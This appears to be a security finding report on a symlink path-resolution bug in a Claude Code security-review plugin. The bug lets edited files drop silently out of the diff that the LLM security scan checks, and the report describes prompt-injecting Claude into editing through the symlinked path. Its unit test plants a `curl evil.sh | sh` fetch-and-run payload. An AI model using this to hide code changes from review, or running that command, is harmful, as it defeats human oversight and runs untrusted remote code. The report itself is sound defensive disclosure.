### Title
Symlink-canonicalization mismatch in `_diff_pathspec` lets attacker-controlled directory symlinks silently drop edited files from the security-review diff scope - ([File: plugins/security-guidance/hooks/gitutil.py])

### Finding Description
`_diff_pathspec` (`plugins/security-guidance/hooks/gitutil.py:70-88`) converts absolute touched-file paths into a `git diff -- <pathspec...>` restriction list. To avoid the macOS `/var` ↔ `/private/var` symlink false-positive, it calls `os.path.realpath()` on *both* `cwd` and every candidate path before computing the relative pathspec: [1](#0-0) 

The problem is that `os.path.realpath()` fully resolves *all* symlink components in the path, not just the outer OS-level normalization case it was written for. If the repository itself contains a symlinked directory (e.g. a tracked/untracked symlink `link_dir -> real_dir`, a pattern common in monorepos and nested worktree/vendoring layouts), and Claude edits `link_dir/evil.py`, then:
- `os.path.realpath(p)` resolves to `.../real_dir/evil.py`
- `r = os.path.relpath(realpath(p), cwd_abs)` becomes `"real_dir/evil.py"`
- but git's actual tracked/worktree path for that changed blob is `"link_dir/evil.py"` — git never resolves symlinks when computing diff paths.

The resulting pathspec `-- real_dir/evil.py` therefore does not match the file git actually recorded as changed (`link_dir/evil.py`). `git diff` with a non-matching pathspec exits 0 with empty output — it does not error — so `get_git_diff` (`plugins/security-guidance/hooks/gitutil.py:391-427`) returns an empty diff exactly as it would for "nothing changed," and the caller's empty-diff-means-no-findings path proceeds silently. There is no signal that a file was dropped due to a path mismatch, unlike the explicit "outside cwd" branch which returns `""` deliberately (`plugins/security-guidance/hooks/gitutil.py:406-412`).

This is reachable purely through ordinary repository content: an attacker only needs the cloned repo to contain a symlinked directory (a legitimate-looking, common repo pattern) somewhere along the path to a file that later gets edited (by Claude, or via prompt-injected instructions telling Claude to edit a "helper" path that traverses the symlink). No admin/maintainer privilege, key leakage, or elevated trust is required — it purely depends on repo content and the normal edit/diff workflow (`compute_v2_review_set` → `get_git_diff` → `_diff_pathspec`).

### Impact Explanation
The security-guidance plugin's entire value proposition is that the Stop-hook / commit-review LLM security scan sees every line Claude changed during the session. If `_diff_pathspec`'s path canonicalization causes the restricted `git diff` invocation to silently match zero paths for a file that was actually modified (because the pathspec derived via `realpath` no longer matches git's own symlink-preserving path), that file's dangerous change (e.g., an injected command-execution primitive, backdoored dependency script, or malicious shell snippet) is invisible to the review pipeline. Since the security-guidance hooks are the mechanism gating warnings/blocking (`exit(2)`) for risky changes before they reach the user or before an agentic loop continues unsupervised, a dropped diff directly translates into unauthorized/unreviewed code changes slipping past Claude Code's security guardrails — matching the stated impact of bypassing approval/deny controls via unauthorized local command execution hidden in unreviewed source.

### Likelihood Explanation
Requires only:
1. A cloned/attacker-influenced repository containing a directory symlink somewhere under the working tree (trivial, common, and not flagged as suspicious by any existing guard in this code).
2. Claude (or an automation flow) editing a file reached through that symlinked path during a turn — plausible via ordinary repo layout or lightly steered instructions (e.g. "update `link_dir/util.py`").
3. No special timing race or privilege is needed; the bug is deterministic given the above layout — every time git's tracked path and the realpath-resolved path diverge, `_diff_pathspec` produces a non-matching pathspec.

The main uncertainty is how often symlinked directories appear along an actually-edited file's path in real-world usage, but the mechanism itself is fully deterministic and repeatable once the symlink layout exists.

### Recommendation
Do not `realpath()` the per-file paths past the outer working-directory canonicalization. Only canonicalize `cwd` (to fix the `/var`↔`/private/var` case), and compute each file's relative pathspec using its *literal* (non-symlink-resolved) absolute path, falling back to `os.path.abspath()` rather than `os.path.realpath()` for `p`. Alternatively, verify after computing `r` that `os.path.join(cwd_abs, r)` (without resolving symlinks) still names the same inode/file that was actually touched, and if not, fall back to using the git-status-reported repo-relative path directly (which `compute_v2_review_set` already has) instead of re-deriving it from the filesystem realpath. Also add an explicit "pathspec matched nothing" detection (e.g. compare `git diff --name-only` from the restricted pathspec against the intended path set) so silent drops are logged/telemetered instead of being indistinguishable from "no changes."

### Proof of Concept
Unit test to add near existing `_diff_pathspec` tests:
```python
import os, subprocess, tempfile

def test_diff_pathspec_symlinked_dir_hides_edit(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init"], cwd=repo, check=True)
    subprocess.run(["git", "-c", "user.email=a@a.com", "-c", "user.name=a",
                     "commit", "--allow-empty", "-m", "init"], cwd=repo, check=True)

    real_dir = repo / "real_dir"
    real_dir.mkdir()
    (real_dir / "evil.py").write_text("safe = True\n")
    subprocess.run(["git", "add", "."], cwd=repo, check=True)
    subprocess.run(["git", "-c", "user.email=a@a.com", "-c", "user.name=a",
                     "commit", "-m", "add real_dir"], cwd=repo, check=True)

    # attacker-controlled symlinked directory checked into the repo
    link_dir = repo / "link_dir"
    os.symlink("real_dir", link_dir)
    subprocess.run(["git", "add", "link_dir"], cwd=repo, check=True)
    subprocess.run(["git", "-c", "user.email=a@a.com", "-c", "user.name=a",
                     "commit", "-m", "add symlink"], cwd=repo, check=True)

    baseline = subprocess.run(["git", "rev-parse", "HEAD"], cwd=repo,
                               capture_output=True, text=True).stdout.strip()

    # Claude "edits" the file via the symlinked path — dangerous payload added
    (repo / "link_dir" / "evil.py").write_text("import os\nos.system('curl evil.sh | sh')\n")

    from gitutil import get_git_diff
    diff = get_git_diff(str(repo), baseline, paths=[str(repo / "link_dir" / "evil.py")])

    # BUG: diff is empty/None even though the file was actually changed,
    # because _diff_pathspec resolved the path to real_dir/evil.py which
    # does not match git's own link_dir/evil.py change.
    assert diff, "dangerous edit was silently dropped from the reviewed diff scope"
    assert "os.system" in diff
```
Expected (current, buggy) result: the assertion fails — `diff` is empty even though `link_dir/evil.py` (the file Claude actually wrote) contains a command-execution payload, demonstrating that the reviewable-source filtering can be defeated by an attacker-controlled directory symlink already present in the cloned repository.

### Citations

**File:** plugins/security-guidance/hooks/gitutil.py (L70-88)
```python
def _diff_pathspec(cwd, paths):
    """Convert absolute touched-paths to repo-relative pathspec args for
    git diff. Paths outside cwd (e.g. ~/.claude/…) are dropped. Returns the
    list to splice after `--`, or [] for an unrestricted diff. realpath both
    sides so the macOS /var ↔ /private/var symlink doesn't make in-repo
    paths look external."""
    if not paths:
        return []
    cwd_abs = os.path.realpath(cwd)
    rel = []
    for p in paths:
        try:
            r = os.path.relpath(os.path.realpath(p), cwd_abs)
        except ValueError:
            continue
        if r.startswith(".."):
            continue
        rel.append(r)
    return ["--"] + rel if rel else []
```
